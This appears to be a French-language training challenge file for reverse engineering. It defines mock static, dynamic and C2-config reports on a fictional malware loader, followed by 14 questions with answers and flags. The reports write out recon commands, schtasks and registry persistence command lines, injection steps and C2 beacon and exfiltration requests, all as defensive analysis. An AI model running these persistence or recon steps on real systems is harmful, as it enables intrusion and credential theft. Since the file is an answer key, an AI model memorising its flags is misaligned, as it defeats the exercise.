"""
Challenge 16 -- Reverse Engineering Malware
Niveau : 5 (Threat Hunter)
Categorie : Reverse Engineering
"""

ARTIFACT_STATIC_ANALYSIS = r"""
========== RAPPORT D'ANALYSE STATIQUE -- health_check.exe ==========
Analyste : CERT-SOC RedPawn
Date : 18/02/2026
Classification : CONFIDENTIEL
Outil : IDA Pro 8.3, PE-bear, FLOSS, DIE (Detect It Easy)

===== METADONNEES PE =====
Nom fichier    : health_check.exe
SHA256         : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
MD5            : 7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c
SHA1           : 3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f
SSDeep         : 12288:xYz3Ab4Cd5:xYz3Ab4Cd5
Taille         : 458752 bytes (448 KB)
Type           : PE32+ executable (GUI) x86-64
Subsystem      : Windows GUI (0x0002)
Compilateur    : MSVC 14.36.32532 (Visual Studio 2022 17.6)
Linker         : 14.36.32532
Timestamp      : 2026-02-13 19:44:12 UTC
Packer         : UPX 4.2.2 (detecte par Detect It Easy)
Entropy totale : 7.89 (haute -- confirme le packing)
Apres unpack   : 1.2 MB, entropy globale 5.34

===== TABLE DES SECTIONS PE =====
Section     | VirtSize  | RawSize   | Entropy | Permissions     | Notes
------------+-----------+-----------+---------+-----------------+---------------------------
.text       | 0x42000   | 0x41200   | 6.72    | R-X (Execute)   | Code principal
.rdata      | 0x1A000   | 0x19800   | 5.84    | R-- (ReadOnly)  | Imports + strings
.data       | 0x8000    | 0x6200    | 4.12    | RW- (ReadWrite) | Variables globales
.rsrc       | 0x3000    | 0x2E00    | 3.45    | R-- (ReadOnly)  | Ressources (icone, manifest)
.reloc      | 0x4000    | 0x3800    | 5.91    | R-- (ReadOnly)  | Relocations
.ph0n       | 0x12000   | 0x11A00   | 7.98    | RW- (ReadWrite) | SECTION CUSTOM -- Config chiffree

Analyse section .ph0n :
  Entropy 7.98 -> donnees chiffrees ou compressees
  Pas de section standard Windows -- ajoutee par l'auteur du malware
  Contient la configuration C2 chiffree en AES-256-CBC
  Marker de debut : "==PH0N_CONFIG==" (16 bytes)
  Cle de dechiffrement derivee de "Ph4nt0mCr4n3_2026!" via PBKDF2-SHA256 (10000 iterations)
  IV: 16 premiers bytes apres le marker

===== ANALYSE DES RESSOURCES (PE-bear) =====
Resource ID  | Type     | Lang     | Size    | Description
-------------+----------+----------+---------+----------------------------------------
1            | ICON     | Neutral  | 4.2 KB  | Icone Windows Defender (volee/copiee)
2            | MANIFEST | English  | 1.1 KB  | requestedExecutionLevel = "asInvoker"
3            | VERSION  | English  | 0.8 KB  | Voir ci-dessous

Version Info :
  CompanyName      : Microsoft Corporation
  FileDescription  : Windows Defender Health Service
  FileVersion      : 4.18.2302.7
  InternalName     : WinDefHealthCheck
  LegalCopyright   : Copyright Microsoft Corp.
  OriginalFilename : MsMpHealthCheck.exe
  ProductName      : Microsoft Windows Defender
  ProductVersion   : 4.18.2302.7
  Note ANALYSTE    : TOUTES ces metadonnees sont FALSIFIEES
                     Le vrai nom est visible dans InternalName

===== ANALYSE VIRUSTOTAL =====
Premiere soumission : 2026-02-18 16:00:00 UTC
Detection : 3/72 (au moment de l'analyse)
  - CrowdStrike   : Win64/PhantomLoader.A (ML, confidence 85%)
  - SentinelOne   : Trojan.GenericKD.71234567 (heuristique)
  - Kaspersky     : HEUR:Trojan.Win64.Agent.gen (heuristique)
NON detecte par : Windows Defender, ESET, Bitdefender, Sophos, McAfee,
                  TrendMicro, Avast, Norton, Malwarebytes
Categorie VT     : Trojan / Loader
MITRE ATT&CK tags: T1055.004, T1140, T1027.002, T1497.001

===== ANALYSE DES STRINGS (FLOSS -- apres unpack) =====

--- Strings ASCII claires (selection pertinente) ---
WinDefHealthCheck
Microsoft Corporation
Windows Defender Health Service
PERS1ST_M0DUL3
cmd.exe /c whoami
cmd.exe /c systeminfo
cmd.exe /c net user /domain
cmd.exe /c nltest /dclist:
cmd.exe /c net group "Domain Admins" /domain
cmd.exe /c ipconfig /all
cmd.exe /c net share
cmd.exe /c wmic qfe list brief
cmd.exe /c netstat -an
C:\Windows\Temp\
C:\ProgramData\Microsoft\Crypto\
\\.\pipe\health_svc_pipe
svcctl
schtasks /create /tn "WinDefUpdate" /tr
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Content-Type: application/octet-stream
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
X-Session-ID:
X-Host-ID:
X-Ph0n-Agent:
AES-256-CBC
PKCS7
bcrypt.dll
BCryptEncrypt
BCryptDecrypt
BCryptGenerateSymmetricKey

--- Strings encodees XOR (deobfusquees par FLOSS, cle: 0x5A) ---
config_decrypt_key: Ph4nt0mCr4n3_2026!
api_path: /api/v2/beacon
sleep_interval: 60
jitter_pct: 5
max_retries: 3
kill_date: 2026-06-15
proxy_aware: true
inject_method: early_bird
target_process: RuntimeBroker.exe
c2_primary: 185.234.72.19
c2_port: 443
c2_fallback: 91.215.85.142
c2_fallback_port: 8443
protocol: https
cert_pin: sha256/9f3a2b8c1d4e5f6a7b8c9d0e1f2a3b4c...
exfil_max_size: 10485760
screenshot_interval: 300
keylog_enabled: false
persistence_method: schtask+registry

--- Strings Unicode (UTF-16LE) ---
\\SRV-DC-01.redpawn.local
\\SRV-FILE-02.redpawn.local
SOFTWARE\Microsoft\Windows NT\CurrentVersion
HARDWARE\DESCRIPTION\System\BIOS
SystemBiosVersion
VMware
VirtualBox
QEMU
Hyper-V

--- Strings NON resolues (possiblement chiffrees residuelles) ---
xK7mP2qR9sT4uV6wY8zA1bC3dE5fG (32 chars -- cle AES?)
$2a$12$LmN7oP8qR9sT0uV1wX2yZ (bcrypt hash -- mot de passe hardcode?)

===== ANALYSE DES IMPORTS (IAT) =====

--- kernel32.dll (27 imports) ---
CreateProcessA, CreateProcessW, CreateProcessInternalW
VirtualAllocEx, VirtualProtectEx, WriteProcessMemory, ReadProcessMemory
CreateRemoteThread, NtCreateThreadEx
OpenProcess, TerminateProcess, GetExitCodeProcess
CreateMutexA, OpenMutexA, ReleaseMutex
CreateThread, SuspendThread, ResumeThread, QueueUserAPC
GetModuleHandleA, GetProcAddress, LoadLibraryA, FreeLibrary
IsDebuggerPresent, CheckRemoteDebuggerPresent
GetTickCount64, QueryPerformanceCounter, QueryPerformanceFrequency
GetSystemInfo, GlobalMemoryStatusEx
GetComputerNameA, GetUserNameA

--- ntdll.dll (12 imports -- utilisation directe syscalls) ---
NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection
NtAllocateVirtualMemory, NtWriteVirtualMemory, NtFreeVirtualMemory
NtQueueApcThread, NtSetContextThread, NtResumeThread
NtQuerySystemInformation, NtQueryInformationProcess
RtlAdjustPrivilege

--- advapi32.dll (14 imports) ---
OpenServiceW, CreateServiceW, StartServiceW, DeleteService
RegSetValueExA, RegOpenKeyExA, RegQueryValueExA, RegDeleteValueA
AdjustTokenPrivileges, OpenProcessToken, LookupPrivilegeValueA
CreateProcessAsUserW, LogonUserW, ImpersonateLoggedOnUser

--- ws2_32.dll (8 imports) ---
WSAStartup, WSACleanup, socket, connect, send, recv, closesocket
inet_addr, htons, gethostbyname

--- winhttp.dll (9 imports) ---
WinHttpOpen, WinHttpConnect, WinHttpOpenRequest
WinHttpSendRequest, WinHttpReceiveResponse, WinHttpReadData
WinHttpSetOption, WinHttpSetCredentials, WinHttpCloseHandle

--- bcrypt.dll (5 imports -- crypto Windows native) ---
BCryptOpenAlgorithmProvider, BCryptGenerateSymmetricKey
BCryptEncrypt, BCryptDecrypt, BCryptDestroyKey

--- crypt32.dll (3 imports) ---
CertOpenStore, CertFindCertificateInStore, CertVerifyCertificateChainPolicy

Note ANALYSTE: L'utilisation de ntdll.dll directe est classique de malware avance
pour bypasser les hooks EDR qui monitent kernel32. Le import de NtCreateSection
+ NtMapViewOfSection indique une technique de process hollowing ou early bird injection.
"""

ARTIFACT_DYNAMIC_ANALYSIS = r"""
========== RAPPORT D'ANALYSE DYNAMIQUE -- health_check.exe ==========
Analyste : CERT-SOC RedPawn
Date : 18/02/2026
Outils : ANY.RUN (sandbox), x64dbg, API Monitor, Procmon, Wireshark

===== ENVIRONNEMENT SANDBOX =====
OS           : Windows 10 21H2 (Build 19044.2604)
RAM          : 8 GB
CPU          : 4 cores (pour bypasser le check anti-VM)
Disk         : 120 GB (pour bypasser le check < 60 GB)
Reseau       : Internet simule (INetSim) + capture PCAP
Duree        : 15 minutes
VM Cloaking  : Activee (noms de processes normaux, pas de VMware Tools)

===== TIMELINE D'EXECUTION =====

[Phase 0 -- Unpacking] T+0s -> T+2s
  00:00.000 | Process health_check.exe demarre (PID 4856)
  00:00.120 | UPX self-extraction en memoire (section .UPX0 -> .text)
  00:00.450 | Taille en memoire apres unpack: 1.2 MB
  00:01.200 | Entry point reel atteint: RVA 0x00014A30 (main())
  00:01.800 | Charge bcrypt.dll (crypto native Windows)

[Phase 1 -- Anti-Analyse] T+2s -> T+8s
  00:02.100 | IsDebuggerPresent() -> retourne 0 (pas de debugger)
  00:02.300 | CheckRemoteDebuggerPresent() -> retourne 0
  00:02.500 | GetTickCount64() enregistre T1 = 1708264800000
  00:02.800 | NtQuerySystemInformation(SystemProcessInformation)
               -> Enumere tous les processus en cours
               -> Cherche: vmtoolsd.exe, vboxservice.exe, procmon.exe,
                  wireshark.exe, x64dbg.exe, ida64.exe, ollydbg.exe,
                  processhacker.exe, fiddler.exe, charles.exe
               -> Resultat: AUCUN trouve (sandbox cloak fonctionnel)
  00:03.100 | GetTickCount64() enregistre T2 = 1708264800310
               -> Delta = 310ms (< 1000ms threshold) -> OK, pas de sandbox lente
  00:03.500 | GetSystemInfo() -> NbProcessors = 4 (>= 2) -> OK
  00:03.800 | GlobalMemoryStatusEx() -> TotalPhys = 8 GB (>= 4 GB) -> OK
  00:04.200 | RegOpenKeyExA(HARDWARE\DESCRIPTION\System\BIOS)
               -> SystemBiosVersion lu -> pas "VBOX" ni "VMWARE" -> OK
  00:04.600 | CreateFileA("C:\\Windows\\System32\\drivers\\vmhgfs.sys")
               -> ERROR_FILE_NOT_FOUND -> OK (pas VMware)
  00:05.000 | Disk check via GetDiskFreeSpaceExA("C:\\")
               -> TotalBytes = 120 GB (>= 60 GB) -> OK
  00:05.500 | GetUserNameA() -> "jdupont" (pas "admin/user/test/sandbox") -> OK
  00:06.000 | RDTSC timing check (2x)
               -> Delta: 847 cycles (< 10000 threshold) -> OK
  00:07.000 | TOUTES les 7+ checks anti-analyse passees -> continue execution

[Phase 2 -- Persistence] T+8s -> T+15s
  00:08.000 | CreateMutexA("PERS1ST_M0DUL3") -> Success (premiere instance)
  00:08.500 | Se copie vers: C:\ProgramData\Microsoft\Crypto\health_check.exe
               -> SetFileAttributesA() -> HIDDEN + SYSTEM
  00:09.000 | schtasks /create /tn "WinDefUpdate" /tr
               "C:\ProgramData\Microsoft\Crypto\health_check.exe"
               /sc ONLOGON /rl HIGHEST /f
  00:10.000 | RegSetValueExA(HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,
               "WinDefHealthCheck",
               "C:\ProgramData\Microsoft\Crypto\health_check.exe")
  00:10.500 | CreateServiceW("WinDefenderUpdate",
               "Windows Defender Update Service",
               SERVICE_AUTO_START,
               "C:\ProgramData\Microsoft\Crypto\health_check.exe")
  00:11.000 | 3 mecanismes de persistance installes (ceinture + bretelles)

[Phase 3 -- Reconnaissance] T+15s -> T+45s
  00:15.000 | CreateProcessA("cmd.exe /c whoami") -> "redpawn\jdupont"
  00:16.000 | CreateProcessA("cmd.exe /c systeminfo")
               -> OS: Windows 10 Enterprise, Domain: redpawn.local
  00:18.000 | CreateProcessA("cmd.exe /c net user /domain")
               -> Liste 342 utilisateurs AD
  00:20.000 | CreateProcessA("cmd.exe /c nltest /dclist:")
               -> SRV-DC-01.redpawn.local (PDC)
  00:22.000 | CreateProcessA("cmd.exe /c net group \"Domain Admins\" /domain")
               -> admin.rsi, j.martin, svc-backup, Administrator
  00:24.000 | CreateProcessA("cmd.exe /c ipconfig /all")
               -> 10.0.1.45, DNS: 10.0.0.10
  00:26.000 | CreateProcessA("cmd.exe /c net share")
               -> ADMIN$, C$, IPC$, NETLOGON, SYSVOL
  00:28.000 | CreateProcessA("cmd.exe /c wmic qfe list brief")
               -> Derniere MAJ: KB5034441 (12/01/2026) -- 36 jours de retard
  00:30.000 | CreateProcessA("cmd.exe /c netstat -an")
               -> Ports ouverts: 135, 139, 445, 3389, 5985
  00:32.000 | Resultats concatenes, chiffres AES-256-CBC, stockes dans
               C:\Windows\Temp\~DF7A2B.tmp (225 KB)

[Phase 4 -- Injection] T+45s -> T+60s
  00:45.000 | OpenProcess(RuntimeBroker.exe, PID 1284)
               -> PROCESS_ALL_ACCESS obtenu
  00:45.500 | NtCreateSection(SEC_COMMIT, PAGE_EXECUTE_READWRITE, 0x40000)
  00:46.000 | NtMapViewOfSection() dans health_check.exe (source)
  00:46.500 | Copie du shellcode dans la section mappee (64 KB)
  00:47.000 | NtMapViewOfSection() dans RuntimeBroker.exe (cible, PID 1284)
  00:47.500 | NtQueueApcThread() -> thread principal de RuntimeBroker.exe
  00:48.000 | Thread APC execute -> shellcode injecte dans RuntimeBroker.exe
  00:48.500 | health_check.exe termine son propre thread d'injection
  00:49.000 | Le shellcode dans RuntimeBroker.exe prend le relais
               -> A partir d'ici, tout le trafic C2 sort de RuntimeBroker.exe (PID 1284)
               -> Technique: Early Bird APC Injection via Section Mapping
               -> Type MITRE: T1055.004 (Asynchronous Procedure Call)

[Phase 5 -- Communication C2] T+60s -> T+15min
  01:00.000 | [RuntimeBroker.exe PID 1284] WinHttpConnect(185.234.72.19, 443)
  01:00.500 | Certificate pinning verifie (SHA256 match) -> OK
  01:01.000 | POST /api/v2/beacon HTTP/1.1
               Host: 185.234.72.19
               User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
               X-Session-ID: 7f8a9b0c-1d2e-3f4a-5b6c-7d8e9f0a1b2c
               X-Host-ID: WKS-COMPTA-PC03
               X-Ph0n-Agent: 2.4.1
               Content-Type: application/octet-stream
               [Body: 225 KB chiffre AES-256-CBC -- resultats recon]

  01:02.000 | Reponse C2: HTTP 200
               -> Tasking recu: "LOAD_MODULE mimikatz reflective"
  01:03.000 | GET /api/v2/modules/katz.dll HTTP/1.1
               -> Telecharge mimikatz reflective DLL (1.8 MB, chiffre)
  01:04.000 | Dechiffrement AES -> injection reflective dans RuntimeBroker.exe
  01:05.000 | Mimikatz en memoire execute sekurlsa::logonpasswords
               -> 8 credential sets extraits (NTHash + plaintext pour 3)
  01:06.000 | POST /api/v2/beacon -> Upload credentials (4.2 KB chiffre)

  01:07.000 | C2 Tasking: "SCREENSHOT"
  01:07.500 | Capture ecran (1920x1080, JPG 340 KB)
  01:08.000 | POST /api/v2/beacon -> Upload screenshot

  02:00.000 | Beacon #2: POST /api/v2/beacon (heartbeat, 128 bytes)
               -> C2: "SLEEP" (pas de nouveau tasking)
  03:00.000 | Beacon #3: heartbeat
  04:02.300 | Beacon #4: heartbeat (jitter +2.3s = 3.8%)
  05:01.100 | Beacon #5: heartbeat (jitter +1.1s = 1.8%)
  ...
  14:58.700 | Beacon #14: heartbeat (fin de la capture sandbox)

===== INDICATEURS RESEAU (Wireshark) =====
Connexions sortantes depuis RuntimeBroker.exe (PID 1284) :
  Dest IP          | Port | Proto | Bytes Out | Bytes In  | CN certificat
  -----------------+------+-------+-----------+-----------+---------------------
  185.234.72.19    | 443  | TLS   | 234,567   | 1,892,345 | *.update-service.xyz
  91.215.85.142    | 8443 | TLS   | 0         | 0         | (tentative echouee)
  Note: Le C2 fallback (91.215.85.142:8443) a ete contacte a T+5min quand le
  primaire n'a pas repondu pendant 3 beacons consecutifs. Echec car certificat
  ne matchait pas le pin attendu (rotation recente cote serveur?).

JA3 fingerprint du client TLS : 72a589da586844d7f0818ce684948eea
JA3S fingerprint du serveur  : f4e48e8a6e3f3437c8997fa61b4e3bbc
Note: Le JA3 est identique a celui observe chez les 5 victimes PHANTOM CRANE

===== ARTEFACTS FORENSIQUES CREES =====
Fichiers crees sur le systeme :
  Chemin                                              | Taille  | Hash SHA256
  ----------------------------------------------------+---------+----------
  C:\ProgramData\Microsoft\Crypto\health_check.exe    | 448 KB  | a1b2c3d4...
  C:\Windows\Temp\~DF7A2B.tmp                         | 225 KB  | (donnees recon chiffrees)
  Aucun fichier de log, aucun fichier de config sur disque -> tout en memoire

Cles de registre modifiees :
  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinDefHealthCheck
  HKLM\SYSTEM\CurrentControlSet\Services\WinDefenderUpdate

Taches planifiees :
  "WinDefUpdate" (logon trigger, HIGHEST privileges)

Service cree :
  "WinDefenderUpdate" (auto-start, description: "Windows Defender Update Service")

Named pipes :
  \\.\pipe\health_svc_pipe (utilise pour communication parent -> injecte)

Mutex :
  PERS1ST_M0DUL3

===== TECHNIQUES ANTI-ANALYSE DETECTEES =====
# | Technique                  | API/Methode                      | Seuil/Check
--+----------------------------+----------------------------------+-------------------
1 | API Debugger Check         | IsDebuggerPresent                | != 0
2 | Remote Debugger Check      | CheckRemoteDebuggerPresent       | != 0
3 | Timing (API)               | GetTickCount64 delta             | > 1000ms
4 | Timing (CPU)               | RDTSC delta                      | > 10000 cycles
5 | Process Enumeration        | NtQuerySystemInformation         | Liste de 10 noms
6 | CPU Core Count             | GetSystemInfo                    | < 2 cores
7 | RAM Size                   | GlobalMemoryStatusEx             | < 4 GB
8 | Disk Size                  | GetDiskFreeSpaceExA              | < 60 GB
9 | BIOS String                | Registry BIOS key                | "VBOX"/"VMWARE"
10| VMware File                | CreateFileA vmhgfs.sys           | File exists
11| Username                   | GetUserNameA                     | Blacklist 6 noms
Total: 11 techniques anti-analyse
"""

ARTIFACT_CONFIG_EXTRACTION = r"""
========== EXTRACTION DE CONFIGURATION -- health_check.exe ==========
Analyste : CERT-SOC RedPawn
Date : 18/02/2026
Outil : Script Python custom + x64dbg (breakpoint sur BCryptDecrypt)

===== METHODE D'EXTRACTION =====
1. Breakpoint sur BCryptDecrypt dans x64dbg
2. Execution jusqu'au dechiffrement de la section .ph0n
3. Dump du buffer dechiffre (4096 bytes utiles sur 73728 section)
4. Parsing du format de configuration

===== FORMAT DE CONFIGURATION =====
La config utilise un format binaire custom :
  [16 bytes] Marker: ==PH0N_CONFIG==
  [16 bytes] IV (AES-256-CBC)
  [4 bytes]  Config version (uint32, little-endian) -> 0x00000024 (v36)
  [4 bytes]  Nombre de champs (uint32) -> 0x00000017 (23 champs)
  [N bytes]  Champs au format: [1 byte type][2 bytes len][data]
             Types: 0x01=string, 0x02=uint32, 0x03=bool, 0x04=binary

===== CONFIGURATION EXTRAITE (v36, 23 champs) =====
Champ                  | Type   | Valeur
-----------------------+--------+--------------------------------------------
campaign_id            | string | PH0N-2026-017
target_org             | string | RedPawn SAS
operator_id            | string | crane_op_3
c2_primary             | string | 185.234.72.19
c2_port                | uint32 | 443
c2_fallback            | string | 91.215.85.142
c2_fallback_port       | uint32 | 8443
c2_tertiary            | string | 193.42.33.7
c2_tertiary_port       | uint32 | 443
api_path               | string | /api/v2/beacon
protocol               | string | https
sleep_interval         | uint32 | 60 (secondes)
jitter_pct             | uint32 | 5 (%)
max_retries            | uint32 | 3
kill_date              | string | 2026-06-15
proxy_aware            | bool   | true
inject_method          | string | early_bird
target_process         | string | RuntimeBroker.exe
persistence_method     | string | schtask+registry+service
exfil_max_size         | uint32 | 10485760 (10 MB)
screenshot_interval    | uint32 | 300 (5 minutes)
keylog_enabled         | bool   | false
cert_pin_sha256        | binary | 9f3a2b8c1d4e5f6a7b8c9d0e1f2a3b4c... (32 bytes)

===== ANALYSE DE LA CONFIGURATION =====

1. IDENTIFICATION DE CAMPAGNE
   campaign_id "PH0N-2026-017" -> 17eme campagne de 2026 pour PHANTOM CRANE
   target_org "RedPawn SAS" -> attaque ciblee (pas du spray-and-pray)
   operator_id "crane_op_3" -> operateur #3 (au moins 3 operateurs dans le groupe)

2. INFRASTRUCTURE C2 (3 niveaux de fallback)
   Primaire:   185.234.72.19:443     (AS48693, Russie) -> ACTIF
   Secondaire: 91.215.85.142:8443    (AS48693, Russie) -> ACTIF mais cert mismatch
   Tertiaire:  193.42.33.7:443       (AS62904, USA)    -> ACTIF
   Note: Le C2 tertiaire n'etait PAS dans notre liste IoC initiale!
         -> 193.42.33.7 est aussi le serveur utilise pour monitoring-check.top
         -> Confirme le lien entre l'implant et le vecteur supply chain

3. CAPACITES
   - Beacon configurable (60s + 5% jitter)
   - Exfiltration jusqu'a 10 MB par upload
   - Screenshots automatiques toutes les 5 minutes
   - Keylogger DESACTIVE (mais capability presente dans le code)
   - Support proxy (peut traverser les proxys d'entreprise)
   - Certificate pinning (protection contre l'interception TLS)

4. PERSISTENCE (triple mecanisme)
   - Tache planifiee "WinDefUpdate" (ONLOGON, HIGHEST)
   - Cle Run "WinDefHealthCheck" (auto-start)
   - Service "WinDefenderUpdate" (SERVICE_AUTO_START)
   -> Les 3 pointent vers C:\ProgramData\Microsoft\Crypto\health_check.exe

5. KILL DATE
   Le malware s'auto-desactive le 15/06/2026
   -> Duree de vie prevue: ~4 mois apres compromission
   -> Strategie: eviter la detection a long terme par des IOC permanents
   -> Probablement remplacement prevu par un nouvel implant avant cette date

6. IP TERTIAIRE NON DOCUMENTEE
   193.42.33.7 n'apparait PAS dans le rapport TI initial (Challenge 12)
   comme adresse C2 directe. Elle est listee comme serveur de rebond
   pour monitoring-check.top mais la config montre qu'elle sert aussi
   de C2 tertiaire direct pour l'implant.
   -> AJOUT URGENT a la liste IoC et aux regles firewall
"""

CHALLENGE = {
    "id": "c16_malware_reverse",
    "title": "Le Coeur de la Bete",
    "category": "reverse_engineering",
    "level": 5,
    "points_total": 680,
    "estimated_time": "55-75 min",
    "story": """
## Briefing de Mission

**Date :** 18 fevrier 2026, 17h00
**Priorite :** HAUTE
**Source :** Equipe Malware Analysis / CERT

---

L'executable `health_check.exe` recupere par l'equipe forensique a ete analyse en profondeur. Trois rapports sont disponibles : analyse statique (PE, strings, imports), analyse dynamique (sandbox, timeline, reseau), et extraction de configuration C2.

> *"On a fully reverse le loader de PHANTOM CRANE. C'est du custom, bien code, avec de l'anti-analyse, de l'injection de processus, du certificate pinning. Fouille les rapports et dis-moi tout sur ses capacites, sa configuration C2, et ses mecanismes d'evasion. Attention, la config extraite revele une IP C2 qu'on n'avait pas encore dans nos IoC."*

Reverse engineering avance. Ce challenge teste votre capacite a analyser un rapport de malware complet.

<details>
<summary>Indice methodologique (cliquez pour afficher)</summary>

Croisez les informations entre les 3 artefacts. L'analyse statique donne les strings et imports, l'analyse dynamique montre le comportement reel, et la config extraite revele des details non visibles ailleurs. Cherchez les ecarts entre ce qui est documente et ce qui est rellement dans la config.

</details>
    """,
    "artifacts": [
        {
            "name": "static_analysis_report.txt",
            "type": "forensic_report",
            "content": ARTIFACT_STATIC_ANALYSIS,
            "description": "Analyse statique -- PE headers, strings, imports, VirusTotal"
        },
        {
            "name": "dynamic_analysis_report.txt",
            "type": "sandbox_report",
            "content": ARTIFACT_DYNAMIC_ANALYSIS,
            "description": "Analyse dynamique -- sandbox ANY.RUN, timeline, reseau"
        },
        {
            "name": "config_extraction.txt",
            "type": "malware_config",
            "content": ARTIFACT_CONFIG_EXTRACTION,
            "description": "Extraction de configuration C2 depuis la section .ph0n"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Quel est le nom de la section PE custom qui contient la configuration chiffree du malware ?",
            "answer": ".ph0n",
            "flag": "REDPAWN{.ph0n}",
            "points": 40,
            "hints": [
                "Regardez la table des sections PE dans l'analyse statique",
                "C'est la seule section non-standard avec une entropy de 7.98"
            ],
            "hint_cost": 13
        },
        {
            "id": "q2",
            "text": "Combien de techniques anti-analyse le malware utilise-t-il au total ?",
            "answer": "11",
            "flag": "REDPAWN{11}",
            "points": 40,
            "hints": [
                "Comptez dans le tableau des techniques anti-analyse de l'analyse dynamique",
                "Il y a plus que les 7 initialement listees dans la section texte"
            ],
            "hint_cost": 13
        },
        {
            "id": "q3",
            "text": "Quelle est l'adresse IP C2 tertiaire decouverte dans la config extraite qui n'etait PAS dans la liste IoC initiale ?",
            "answer": "193.42.33.7",
            "flag": "REDPAWN{193.42.33.7}",
            "points": 60,
            "hints": [
                "Regardez la section 6 de l'analyse de configuration",
                "Cette IP etait listee comme serveur de rebond mais pas comme C2 direct"
            ],
            "hint_cost": 20
        },
        {
            "id": "q4",
            "text": "Quel est le campaign_id dans la configuration extraite du malware ?",
            "answer": "PH0N-2026-017",
            "flag": "REDPAWN{PH0N-2026-017}",
            "points": 40,
            "hints": [
                "C'est dans la configuration extraite",
                "Ca indique le numero de campagne de PHANTOM CRANE"
            ],
            "hint_cost": 13
        },
        {
            "id": "q5",
            "text": "Quel est le OriginalFilename dans les metadonnees PE falsifiees ?",
            "answer": "MsMpHealthCheck.exe",
            "flag": "REDPAWN{MsMpHealthCheck.exe}",
            "points": 50,
            "hints": [
                "C'est dans la section Version Info de l'analyse statique",
                "Le malware se fait passer pour un outil Microsoft Defender"
            ],
            "hint_cost": 17
        },
        {
            "id": "q6",
            "text": "Combien de mecanismes de persistance le malware installe-t-il ? Listez-les (schtask, registry, service).",
            "answer": "3",
            "flag": "REDPAWN{3}",
            "points": 40,
            "hints": [
                "Regardez la Phase 2 de l'analyse dynamique",
                "Tache planifiee + cle Run + service Windows"
            ],
            "hint_cost": 13
        },
        {
            "id": "q7",
            "text": "Quel est le JA3 fingerprint du client TLS utilise par le malware ?",
            "answer": "72a589da586844d7f0818ce684948eea",
            "flag": "REDPAWN{72a589da586844d7f0818ce684948eea}",
            "points": 50,
            "hints": [
                "C'est dans les indicateurs reseau de l'analyse dynamique",
                "Le meme JA3 a ete observe chez les 5 victimes PHANTOM CRANE"
            ],
            "hint_cost": 17
        },
        {
            "id": "q8",
            "text": "Quel identifiant operateur est present dans la configuration, indiquant au moins combien d'operateurs dans le groupe ?",
            "answer": "crane_op_3",
            "flag": "REDPAWN{crane_op_3}",
            "points": 50,
            "hints": [
                "Regardez le champ operator_id dans la config",
                "Le numero indique un minimum d'operateurs"
            ],
            "hint_cost": 17
        },
        {
            "id": "q9",
            "text": "Combien de credentials sets ont ete extraits par mimikatz en sandbox ?",
            "answer": "8",
            "flag": "REDPAWN{8}",
            "points": 40,
            "hints": [
                "Regardez la Phase 5 de l'analyse dynamique (T+65s)",
                "sekurlsa::logonpasswords a extrait des NTHash et plaintext"
            ],
            "hint_cost": 13
        },
        {
            "id": "q10",
            "text": "Quel est le seuil de detection du timing check RDTSC en cycles CPU ?",
            "answer": "10000",
            "flag": "REDPAWN{10000}",
            "points": 50,
            "hints": [
                "Regardez le tableau des techniques anti-analyse #4",
                "Si le delta RDTSC depasse ce seuil, le malware considere qu'il est debugge"
            ],
            "hint_cost": 17
        },
        {
            "id": "q11",
            "text": "A quelle frequence (en secondes) le malware prend-il des screenshots automatiquement ?",
            "answer": "300",
            "flag": "REDPAWN{300}",
            "points": 40,
            "hints": [
                "Regardez screenshot_interval dans la configuration extraite",
                "300 secondes = 5 minutes"
            ],
            "hint_cost": 13
        },
        {
            "id": "q12",
            "text": "Combien d'iterations PBKDF2-SHA256 sont utilisees pour deriver la cle de dechiffrement de la section .ph0n ?",
            "answer": "10000",
            "flag": "REDPAWN{10000}",
            "points": 50,
            "hints": [
                "Regardez l'analyse de la section .ph0n dans l'analyse statique",
                "La cle est derivee via PBKDF2-SHA256 avec un nombre specifique d'iterations"
            ],
            "hint_cost": 17
        },
        {
            "id": "q13",
            "text": "Quel est le numero de version de la configuration extraite (en decimal) ?",
            "answer": "36",
            "flag": "REDPAWN{36}",
            "points": 50,
            "hints": [
                "Regardez le format de configuration dans l'extraction",
                "Config version: 0x00000024 en hexadecimal"
            ],
            "hint_cost": 17
        },
        {
            "id": "q14",
            "text": "Pourquoi le C2 fallback (91.215.85.142:8443) a-t-il echoue en sandbox ? (reponse courte)",
            "answer": "cert mismatch",
            "flag": "REDPAWN{cert_mismatch}",
            "points": 50,
            "hints": [
                "Regardez les indicateurs reseau de l'analyse dynamique",
                "Le certificat ne matchait pas le pin attendu"
            ],
            "hint_cost": 17
        }
    ]
}
